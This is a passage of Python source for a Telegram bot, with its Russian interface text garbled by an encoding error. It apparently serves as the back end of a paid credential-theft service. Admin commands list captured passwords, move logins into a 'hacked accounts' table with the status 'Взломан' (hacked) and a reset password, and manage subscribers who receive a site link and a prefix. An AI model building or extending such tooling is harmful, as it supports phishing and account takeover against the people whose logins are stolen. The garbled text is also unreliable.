        bot.answer_callback_query(call.id, "üîí –î–æ—Å—Ç—É–ø–Ω–æ —Ç–æ–ª—å–∫–æ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞–º!")
        return
    try:
        _, login, new_password = call.data.split("_")
        msg = bot.send_message(
            call.message.chat.id,
            f"–õ–æ–≥–∏–Ω: {login}\n–ù–æ–≤—ã–π –ø–∞—Ä–æ–ª—å: {new_password}\n–í–≤–µ–¥–∏—Ç–µ Chat ID –¥–ª—è –ø—Ä–∏–≤—è–∑–∫–∏ (–∏–ª–∏ '–Ω–µ—Ç' –¥–ª—è –ø—Ä–æ–ø—É—Å–∫–∞):"
        )
        bot.register_next_step_handler(msg, lambda m: process_link(m, login, new_password, call.message.message_id))
        bot.answer_callback_query(call.id, "–í–≤–µ–¥–∏—Ç–µ Chat ID")
    except Exception as e:
        bot.answer_callback_query(call.id, f"–û—à–∏–±–∫–∞: {e}")
        print(f"–û—à–∏–±–∫–∞ –≤ handle_link: {e}")

def process_link(message, login, new_password, original_message_id):
    linked_chat_id = message.text if message.text.lower() != "–Ω–µ—Ç" else None
    status = "–í–∑–ª–æ–º–∞–Ω"
    if delete_credential(login):  # –£–¥–∞–ª—è–µ–º –∏–∑ credentials –ø–µ—Ä–µ–¥ –¥–æ–±–∞–≤–ª–µ–Ω–∏–µ–º
        save_hacked_account(login, new_password, prefix=status, sold_status=status, linked_chat_id=linked_chat_id)
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=original_message_id,
            text=f"–õ–æ–≥–∏–Ω: {login}\n–ü–∞—Ä–æ–ª—å: {new_password}\n‚úÖ –î–æ–±–∞–≤–ª–µ–Ω–æ –≤ –≤–∑–ª–æ–º–∞–Ω–Ω—ã–µ —Å–æ —Å—Ç–∞—Ç—É—Å–æ–º '{status}'!\n–ü—Ä–∏–≤—è–∑–∫–∞: {linked_chat_id or '–ù–µ—Ç'}",
            reply_markup=None
        )
        bot.send_message(ADMIN_CHAT_ID, f"üîí {login} –¥–æ–±–∞–≤–ª–µ–Ω–æ –≤ –≤–∑–ª–æ–º–∞–Ω–Ω—ã–µ —Å –ø—Ä–∏–≤—è–∑–∫–æ–π: {linked_chat_id or '–ù–µ—Ç'}!")
    else:
        bot.send_message(message.chat.id, f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ —É–¥–∞–ª–µ–Ω–∏–∏ {login} –∏–∑ credentials!")
    bot.delete_message(message.chat.id, message.message_id)

# === –ê–¥–º–∏–Ω-–∫–æ–º–∞–Ω–¥—ã ===
@bot.message_handler(commands=['admin'])
def admin_cmd(message):
    if not is_admin(message.chat.id):
        bot.reply_to(message, "üîí –ö–æ–º–∞–Ω–¥–∞ –¥–æ—Å—Ç—É–ø–Ω–∞ —Ç–æ–ª—å–∫–æ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞–º!")
        return
    try:
        users_count = len(get_all_users())
        passwords_count = len(get_all_credentials())
        response = f"‚öôÔ∏è –ê–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å:\n–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π: {users_count}\n–ü–∞—Ä–æ–ª–µ–π: {passwords_count}\n\n"
        
        if is_creator(message.chat.id):
            response += "üìã –°–ø–∏—Å–æ–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π:\n"
            users = get_all_users()
            if not users:
                response += "–ù–µ—Ç –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π.\n"
            else:
                for user in users:
                    time_left = user['subscription_end'] - datetime.now()
                    time_str = f"{time_left.days} –¥–Ω–µ–π" if time_left.total_seconds() > 0 else "–ü–æ–¥–ø–∏—Å–∫–∞ –∏—Å—Ç–µ–∫–ª–∞"
                    response += f"Chat ID: {user['chat_id']}\n–ü—Ä–µ—Ñ–∏–∫—Å: {user['prefix']}\n–ü–æ–¥–ø–∏—Å–∫–∞: {time_str}\n\n"
        
        response += "üìú –î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:\n"
        response += "/start - –ù–∞—á–∞—Ç—å —Ä–∞–±–æ—Ç—É —Å –±–æ—Ç–æ–º\n"
        response += "/menu - –ü–æ–∫–∞–∑–∞—Ç—å –≤–∞—à —Å—Ç–∞—Ç—É—Å\n"
        response += "/site - –ü–æ–ª—É—á–∏—Ç—å —Å—Å—ã–ª–∫—É –Ω–∞ —Å–∞–π—Ç (–¥–ª—è –ø–æ–¥–ø–∏—Å—á–∏–∫–æ–≤)\n"
        response += "/hacked - –ü–æ–∫–∞–∑–∞—Ç—å –∏–ª–∏ —É–ø—Ä–∞–≤–ª—è—Ç—å –≤–∑–ª–æ–º–∞–Ω–Ω—ã–º–∏ –∞–∫–∫–∞—É–Ω—Ç–∞–º–∏\n"
        response += "/passwords - –ü–æ–∫–∞–∑–∞—Ç—å —Å–ø–∏—Å–æ–∫ –ø–∞—Ä–æ–ª–µ–π —Å –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å—é —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è\n"
        response += "/admin - –ü–æ–∫–∞–∑–∞—Ç—å –∞–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å\n"
        response += "/setprefix <chat_id> <prefix> <days> - –£—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –ø—Ä–µ—Ñ–∏–∫—Å –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è\n"
        response += "/delprefix <chat_id> - –£–¥–∞–ª–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–∑ –±–∞–∑—ã\n"
        response += "/clearold - –£–¥–∞–ª–∏—Ç—å —Å—Ç–∞—Ä—ã–µ –ø–∞—Ä–æ–ª–∏ (—Å—Ç–∞—Ä—à–µ 7 –¥–Ω–µ–π)\n"
        response += "/getchatid - –£–∑–Ω–∞—Ç—å –≤–∞—à Chat ID\n"
        if is_creator(message.chat.id):
            response += "/opendb - –ü—Ä–æ—Å–º–æ—Ç—Ä –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö (—Ç–æ–ª—å–∫–æ –¥–ª—è –°–æ–∑–¥–∞—Ç–µ–ª—è)\n"
            response += "/database - –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –±–∞–∑–æ–π –¥–∞–Ω–Ω—ã—Ö (—Ç–æ–ª—å–∫–æ –¥–ª—è –°–æ–∑–¥–∞—Ç–µ–ª—è)\n"

        if len(response) > 4096:
            parts = [response[i:i+4096] for i in range(0, len(response), 4096)]
            for part in parts:
                bot.reply_to(message, part)
        else:
            bot.reply_to(message, response)
    except Exception as e:
        bot.reply_to(message, f"‚ùå –û—à–∏–±–∫–∞ –≤ –∞–¥–º–∏–Ω-–ø–∞–Ω–µ–ª–∏: {e}")
        print(f"Error in admin_cmd: {e}")

@bot.message_handler(commands=['setprefix'])
def setprefix_cmd(message):
    if not is_admin(message.chat.id):
        bot.reply_to(message, "üîí –ö–æ–º–∞–Ω–¥–∞ –¥–æ—Å—Ç—É–ø–Ω–∞ —Ç–æ–ª—å–∫–æ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞–º!")
        return
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if len(args) != 3:
        bot.reply_to(message, "‚ùå –§–æ—Ä–º–∞—Ç: /setprefix <chat_id> <prefix> <days>")
        return
    chat_id, prefix, days = args[0], args[1], args[2]
    try:
        days = int(days)
        subscription_end = datetime.now() + timedelta(days=days)
        save_user(chat_id, prefix, subscription_end)
        bot.reply_to(message, f"‚úÖ –ü—Ä–µ—Ñ–∏–∫—Å {prefix} —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –¥–ª—è {chat_id} –Ω–∞ {days} –¥–Ω–µ–π!")
    except ValueError:
        bot.reply_to(message, "‚ùå –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –¥–Ω–µ–π –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å —á–∏—Å–ª–æ–º!")
    except Exception as e:
        bot.reply_to(message, f"‚ùå –û—à–∏–±–∫–∞: {e}")
        print(f"Error in setprefix_cmd: {e}")

@bot.message_handler(commands=['delprefix'])
def delprefix_cmd(message):
    if not is_admin(message.chat.id):
        bot.reply_to(message, "üîí –ö–æ–º–∞–Ω–¥–∞ –¥–æ—Å—Ç—É–ø–Ω–∞ —Ç–æ–ª—å–∫–æ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞–º!")
        return
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if len(args) != 1:
        bot.reply_to(message, "‚ùå –§–æ—Ä–º–∞—Ç: /delprefix <chat_id>")
        return
    chat_id = args[0]
    try:
        delete_user(chat_id)
        bot.reply_to(message, f"‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {chat_id} —É–¥–∞–ª–µ–Ω –∏–∑ –±–∞–∑—ã!")
    except Exception as e:
        bot.reply_to(message, f"‚ùå –û—à–∏–±–∫–∞: {e}")
        print(f"Error in delprefix_cmd: {e}")

@bot.message_handler(commands=['clearold'])
def clearold_cmd(message):
    if not is_admin(message.chat.id):
        bot.reply_to(message, "üîí –ö–æ–º–∞–Ω–¥–∞ –¥–æ—Å—Ç—É–ø–Ω–∞ —Ç–æ–ª—å–∫–æ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞–º!")
        return
    try:
        deleted = clear_old_credentials()
        bot.reply_to(message, f"‚úÖ –£–¥–∞–ª–µ–Ω–æ —Å—Ç–∞—Ä—ã—Ö –ø–∞—Ä–æ–ª–µ–π: {deleted}")
    except Exception as e:
        bot.reply_to(message, f"‚ùå –û—à–∏–±–∫–∞: {e}")
        print(f"Error in clearold_cmd: {e}")

# === –ó–∞–ø—É—Å–∫ ===
def run_bot():
    while True:
        try:
            bot.polling(none_stop=True, interval=0)
        except Exception as e:
            print(f"Bot error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    init_db()
    threading.Thread(target=run_bot).start()
    threading.Thread(target=keep_alive).start()
    port = int(os.environ.get('PORT', 8080))
    app.run(host="0.0.0.0", port=port)